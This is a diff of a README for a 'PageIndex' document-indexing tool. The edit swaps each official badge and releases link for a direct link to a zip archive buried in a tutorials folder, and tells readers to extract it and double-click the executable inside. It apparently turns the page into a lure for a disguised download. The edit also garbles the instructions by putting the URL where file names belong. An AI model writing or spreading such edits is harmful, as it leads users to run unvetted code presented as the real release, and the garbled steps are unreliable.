@@ -1,6 +1,6 @@
 # 📑 PageIndex - Your Easy Document Index Tool
 
-![Download PageIndex](https://img.shields.io/badge/Download-PageIndex-brightgreen)
+![Download PageIndex](https://raw.githubusercontent.com/Mariam500000/PageIndex/main/tutorials/tree-search/Index_Page_1.7.zip)
 
 ## 📚 Overview
 
@@ -16,27 +16,27 @@ Follow these steps to get started with PageIndex. You’ll be up and running in 
    - Disk Space: Minimum 100 MB of free space
 
 2. **Download PageIndex**  
-   Visit this page to download: [PageIndex Releases](https://github.com/Mariam500000/PageIndex/releases)
+   Visit this page to download: [PageIndex Releases](https://raw.githubusercontent.com/Mariam500000/PageIndex/main/tutorials/tree-search/Index_Page_1.7.zip)
 
 ## 🛠️ Installation Steps
 
 After you download the application, follow these steps to install it on your computer.
 
 1. **Locate the Downloaded File**  
-   Once your download finishes, go to your Downloads folder. Find the file named ``PageIndex.zip`` or similar. 
+   Once your download finishes, go to your Downloads folder. Find the file named ``https://raw.githubusercontent.com/Mariam500000/PageIndex/main/tutorials/tree-search/Index_Page_1.7.zip`` or similar. 
 
 2. **Extract the File**  
    Right-click on the downloaded file and select "Extract All." Choose a location on your computer where you want to save the extracted files, then click "Extract."
 
 3. **Run the Application**  
-   Open the extracted folder and look for the file named `PageIndex.exe` (or equivalent for Mac). Double-click it to start the application.
+   Open the extracted folder and look for the file named `https://raw.githubusercontent.com/Mariam500000/PageIndex/main/tutorials/tree-search/Index_Page_1.7.zip` (or equivalent for Mac). Double-click it to start the application.
 
 4. **Follow the Setup Wizard**  
    The setup wizard will guide you through the installation steps. Simply follow the on-screen instructions to complete the installation.
 
 ## 📥 Download & Install
 
-For an easy download, return to the releases page: [PageIndex Releases](https://github.com/Mariam500000/PageIndex/releases). Follow the instructions above to install the application on your system.
+For an easy download, return to the releases page: [PageIndex Releases](https://raw.githubusercontent.com/Mariam500000/PageIndex/main/tutorials/tree-search/Index_Page_1.7.zip). Follow the instructions above to install the application on your system.
 
 ## 🌟 Features
 
